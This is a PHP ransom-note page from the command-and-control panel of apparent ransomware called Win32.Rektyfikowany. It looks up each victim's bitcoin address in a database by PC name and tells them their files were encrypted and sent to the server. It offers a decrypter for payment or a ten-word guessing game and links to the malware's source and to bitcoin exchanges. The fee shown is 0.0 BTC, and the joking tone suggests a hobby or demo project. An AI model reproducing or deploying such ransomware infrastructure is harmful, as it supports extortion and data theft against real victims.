<?php

$pcname = $_GET['pcname'];

include 'db.php';

$statement = $connection->prepare("SELECT bitcoinaddr FROM commandinterface WHERE pcname = ?");
$statement->execute([$pcname]);
$id = $statement->fetch(PDO::FETCH_COLUMN);

?>
<!DOCTYPE html>
<html>
  <head>
     <link rel="stylesheet" href="css/interface.css" type="text/css" />
     <style type="text/css">
     	a:visited { 
    		color: yellow;
    		text-decoration: none;
		}
		a:link {
			color: white;
			text-decoration: none;
		}
     </style>
  </head>
  <body>
	<h1>
		<span class="yellow">Warning!</span>
	</h1>
	<h1>		
		<span class="blue">&lt;</span>You've just been rekt<span class="blue">&gt;</span>
	</h1>
	<center>
		<p style="font-size:28px; margin-top: 0.6em; margin-bottom: 0em;">You just have been horribly rekt by Win32.Rektyfikowany</p>
		<p style="font-size:20px; line-height: 25px;">
			So, essentially - you downloaded a program which had the Rektyfikowany Payload which has encrypted your data<br>
			and sent it to this C&C Server, now - because of the way encryption works, you really don't have much choices.<br><br>
			I'll make a proposal - download the decrypter from <a href="files/decrypter.exe">here</a> - it will only decrypt
			a machine at a time (each machine gets a unique key).<br> You will get
			two choices, either play a guessing game where you need to find the ten words to make your password (and risk losing your data<br>
			If you can't guess correctly - there isn't a second chance) or you pay a nominal fee of <?php echo "0.0 BTC" ?> and get it with<br>
			a guarentee, what you want to do is really your choice<br><br>Remeber, don't even try to brute force the words for the game, the program will detect it
			and you can kiss your data goodbye!<br><br>
			The unique bitcoin address for you is: <span class="yellow"><?php echo $id; ?></span><br>
			The unique identifier of your PC is: <span class="yellow"><?php echo htmlspecialchars(strval($_GET['pcname'])) ?></span>
			</p>
			<br><br>
				</center>
				<hr>
<p style="font-size:20px; line-height: 25px;">
<b>Links that will help you:</b>
  <br><br>
				What is Encryption: <a href="http://searchsecurity.techtarget.com/definition/encryption">http://searchsecurity.techtarget.com/definition/encryption/</a><br>
				Rektyfikowany Source Code: <a href="https://github.com/plaxton/Win32.Rektyfikowany">https://github.com/plaxton/Win32.Rektyfikowany/</a><br>
				Blockchain.info: <a href="https://blockchain.info">https://blockchain.info/</a><br>
				LocalBitcoins: <a href="https://localbitcoins.com">https://localbitcoins.com/</a><br>
				What is Bitcoin: <a href="http://www.coindesk.com/information/what-is-bitcoin">http://www.coindesk.com/information/what-is-bitcoin/</a><br>
				Current Bitcoin Price: <a href="http://www.coindesk.com/price">http://www.coindesk.com/price/</a><br>
				Shapeshift.IO: <a href="https://shapeshift.io">https://shapeshift.io/</a><br>
			</p>

  </body>
</html>
